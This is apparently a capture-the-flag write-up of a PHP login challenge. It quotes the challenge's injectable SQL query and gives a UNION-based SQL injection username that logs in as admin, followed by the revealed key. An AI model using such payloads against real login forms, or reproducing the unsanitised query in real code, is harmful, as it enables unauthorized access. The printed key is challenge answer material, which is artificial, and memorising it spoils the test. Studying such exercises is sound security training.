From their source code, their query is:

$query = @mysql_fetch_array(mysql_query("select user from php3 where (user='$user') and (pw='$pass')"));

and they check the user with:

if($query[user]=="admin") {
    echo "<p>Logged in! Key: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx </p>";
}

All we need is an array with the 'user' column to say 'admin':

Let's modify the query with a UNION injection:

$query = @mysql_fetch_array(mysql_query("select user from php3 where (user='') UNION select user from php3 where (user='admin')")); -- ') and (pw='$pass')"));

Injection: 

Username: ') UNION select user from php3 where (user='admin') -- 
Password: pass

*Note the space after the --


After injection:
Logged in! Key: 8ab9b92c174dd483ad17cee1bb0c5bdb

Key: 8ab9b92c174dd483ad17cee1bb0c5bdb
